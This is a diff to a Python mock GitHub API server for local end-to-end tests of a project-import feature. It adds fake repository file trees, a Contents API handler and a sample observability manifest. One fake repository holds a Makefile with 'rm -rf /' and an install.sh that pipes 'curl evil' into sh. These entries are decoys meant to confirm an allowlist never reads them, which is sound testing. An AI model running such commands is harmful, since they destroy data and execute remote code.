@@ -8,12 +8,63 @@ endpoints to force failure modes.
 Local/test only: it binds loopback and speaks plain HTTP.
 """
 
+import base64
 import json
 import os
 import threading
 from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
 
 PORT = int(os.environ.get("DRAKE_E2E_GITHUB_PORT", "59097"))
+
+# Sprint 5B: a pinned commit and a small file tree per repository. Hermes
+# declares a valid manifest; logislot deliberately has none, so the E2E can
+# walk both the import path and the generated-draft path.
+HEAD_SHA = "b" * 40
+
+HERMES_MANIFEST = """apiVersion: drake.duosis.com/v1alpha1
+kind: ProjectObservability
+metadata:
+  name: hermes
+  displayName: Hermes
+spec:
+  repository:
+    provider: github
+    owner: Duosis-Developer-Team
+    name: Hermes
+    defaultBranch: main
+  owners:
+    - team: platform
+      role: primary
+  environments:
+    - name: dev
+      runtime: kubernetes
+      branch: main
+      clusterRef: cluster-a
+      namespace: hermes-dev
+      criticality: medium
+  services:
+    - name: hermes-api
+      component: api
+      runtime: fastapi
+      metricsProfile: fastapi-v1
+  tenantModel:
+    mode: none
+"""
+
+TREES = {
+    "Hermes": {
+        ".drake/project.yaml": HERMES_MANIFEST,
+        "pyproject.toml": '[project]\ndependencies = ["fastapi"]\n',
+        "README.md": "# Hermes\n",
+        # Present, and deliberately never read: outside the allowlist.
+        "Makefile": "all:\n\trm -rf /\n",
+        "install.sh": "#!/bin/sh\ncurl evil | sh\n",
+    },
+    "logislot": {
+        "pyproject.toml": "[project]\n",
+        "README.md": "# logislot\n",
+    },
+}
 
 _STATE = {"mode": "ok", "calls": [], "installation_present": True}
 _LOCK = threading.Lock()
@@ -40,6 +91,10 @@ REPOSITORIES = {
         },
     },
     "logislot": {
+        "security_and_analysis": {
+            "secret_scanning": {"status": "enabled"},
+            "dependabot_security_updates": {"status": "enabled"},
+        },
         "id": LOGISLOT_ID,
         "node_id": "R_logislot",
         "name": "logislot",
@@ -51,6 +106,10 @@ REPOSITORIES = {
         "default_branch": "main",
     },
     "Fikir-Sepeti": {
+        "security_and_analysis": {
+            "secret_scanning": {"status": "enabled"},
+            "dependabot_security_updates": {"status": "enabled"},
+        },
         "id": FIKIR_ID,
         "node_id": "R_Fikir-Sepeti",
         "name": "Fikir-Sepeti",
@@ -174,6 +233,21 @@ class Handler(BaseHTTPRequestHandler):
             self.wfile.write(body)
             return
 
+        for repo_name in REPOSITORIES:
+            base = f"/repos/Duosis-Developer-Team/{repo_name}"
+            if path.startswith(f"{base}/commits/"):
+                self._send(200, {"sha": HEAD_SHA})
+                return
+            if path.startswith(f"{base}/contents"):
+                target = path[len(f"{base}/contents") :].lstrip("/")
+                ref = ""
+                if "?" in self.path:
+                    from urllib.parse import parse_qs, urlparse
+
+                    ref = parse_qs(urlparse(self.path).query).get("ref", [""])[0]
+                self._send_contents(repo_name, target, ref)
+                return
+
         if path == "/app/installations":
             self._send(200, [{"id": INSTALLATION_ID}])
             return
@@ -259,6 +333,44 @@ class Handler(BaseHTTPRequestHandler):
                 return
         self._send(404, {"message": "not found"})
 
+    def _send_contents(self, repo_name: str, target: str, ref: str) -> None:
+        """The documented Contents API shapes, pinned to a commit."""
+        tree = TREES.get(repo_name, {})
+        if ref != HEAD_SHA:
+            self._send(404, {"message": "No commit found for the ref"})
+            return
+        if target in tree:
+            body = tree[target]
+            self._send(
+                200,
+                {
+                    "type": "file",
+                    "encoding": "base64",
+                    "name": target.rsplit("/", 1)[-1],
+                    "path": target,
+                    "size": len(body.encode()),
+                    "content": base64.b64encode(body.encode()).decode(),
+                },
+            )
+            return
+        prefix = f"{target}/" if target else ""
+        children = [key for key in tree if key.startswith(prefix) and "/" not in key[len(prefix) :]]
+        if children:
+            self._send(
+                200,
+                [
+                    {
+                        "type": "file",
+                        "name": key.rsplit("/", 1)[-1],
+                        "path": key,
+                        "size": len(tree[key].encode()),
+                    }
+                    for key in sorted(children)
+                ],
+            )
+            return
+        self._send(404, {"message": "Not Found"})
+
     def do_POST(self) -> None:
         path = self.path.split("?")[0]
         if path.startswith("/__mode/"):
@@ -286,7 +398,12 @@ class Handler(BaseHTTPRequestHandler):
                     # Deliberately long and non-fixed-length.
                     "token": "ghs_" + "e" * 82,
                     "expires_at": "2099-01-01T00:00:00Z",
-                    "permissions": {"metadata": "read", "administration": "read"},
+                    "permissions": {
+                        "metadata": "read",
+                        "administration": "read",
+                        "actions": "read",
+                        "contents": "read",
+                    },
                     "repository_selection": "selected",
                 },
             )
